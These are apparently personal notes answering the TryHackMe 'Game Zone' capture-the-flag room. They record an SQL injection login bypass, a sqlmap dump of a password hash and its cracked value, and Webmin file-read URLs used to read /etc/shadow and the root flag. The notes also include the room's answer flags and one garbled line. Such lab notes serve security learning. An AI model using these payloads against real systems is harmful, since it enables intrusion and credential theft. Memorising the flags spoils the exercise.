#Game Zone
>Jeff Henschel 24FEB21
https://tryhackme.com/room/gamezone



export IP = url('imaurl('images/header_image.png') transparent no-repeat 100% -1pxges/header_image.png') transparent no-repeat 100% -1px





###Task 1
What is the name of the large cartoon avatar holding a sniper on the forum?
agent 47

'''
had to view source code to get image location, used wget to download and google reverse image search to find
'''



###Task 2
When you've logged in, what page do you get redirected to?
portal.php

'''
sql injection on username 
' or 1=1 -- -
'''

###Task 3
'''
using sql map
https://github.com/sqlmapproject/sqlmap
'''

In the users table, what is the hashed password?
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+


What was the username associated with the hashed password?

agent47

What was the other table name?
post


###Task 4
What is the de-hashed password?
raw-sha256
used ntk.skerritt.blog
also name-that-hash
videogamer124


What is the user flag?
649ac17b1480ac13ef1e4fa579dac95c

###Task 5 
What is the name of the exposed CMS?
webmin		
What is the CMS version?
1.580


###Task 6
What is the root flag?
http://localhost:10000/file/show.cgi/etc/shadow
a4b945830144bdd71908d12d902adeee
http://localhost:10000/file/show.cgi/root/root.txt

